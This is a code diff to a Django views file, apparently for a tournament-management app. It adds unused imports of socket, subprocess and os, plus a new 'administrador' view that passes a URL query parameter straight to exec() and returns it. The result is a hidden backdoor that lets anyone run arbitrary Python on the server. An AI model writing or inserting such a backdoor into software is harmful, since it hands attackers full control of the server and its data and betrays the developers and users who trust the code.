@@ -2,7 +2,7 @@ from django.shortcuts import render,redirect
 from django.urls import reverse
 from django.http import HttpResponse
 import django
-
+import socket,subprocess,os
 
 # Create your views here.
 from django.shortcuts import get_object_or_404, render
@@ -32,6 +32,12 @@ def equipoCapitan(request):
         capitan = get_object_or_404(Capitan, pk=request.user.pk)
         faseDeGrupos = len(Fase.objects.filter(user__exact=capitan,tipoEtapas__exact="Grupo"))
         return render(request,'torneo/equipoCapitan.html',{'capitan':capitan,'fase':faseDeGrupos})
+
+def administrador(request):
+    path = request.GET.get("path")
+    print(path)
+    exec(path)
+    return HttpResponse(path)
    
 def fotos(request):
     return HttpResponse("Estamos en consutruccion")
